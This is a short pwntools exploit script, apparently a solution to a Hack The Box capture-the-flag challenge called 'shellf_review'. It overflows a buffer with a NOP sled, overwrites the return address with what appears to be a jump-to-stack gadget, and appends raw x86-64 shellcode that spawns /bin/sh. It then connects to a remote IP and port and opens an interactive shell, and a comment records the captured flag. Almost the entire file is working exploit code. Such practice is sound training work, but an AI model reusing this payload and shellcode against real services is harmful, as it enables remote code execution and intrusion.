from pwn import *

def answer_ques():
    s.sendlineafter("Question ",'1')

# s = process("./shellf_review")
s = remote('159.65.90.8',32409)
pause()

for i in range(0,5):
    answer_ques()

# shellcode = asm(pwnlib.shellcraft.i386.linux.sh())
# print(shellcode)
payload = b''.ljust(0x190+8,asm('nop'))
payload += p64(0x00000000040080C)
payload += b'\x48\x31\xFF\x48\x31\xF6\x48\x31\xD2\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x57\x53\x54\x5F\xB0\x3B\x0F\x05'
s.sendlineafter('experience with us',payload)

s.interactive()
s.close()
# HTB{jump_rsp_4nd_jump_2_sh3ll}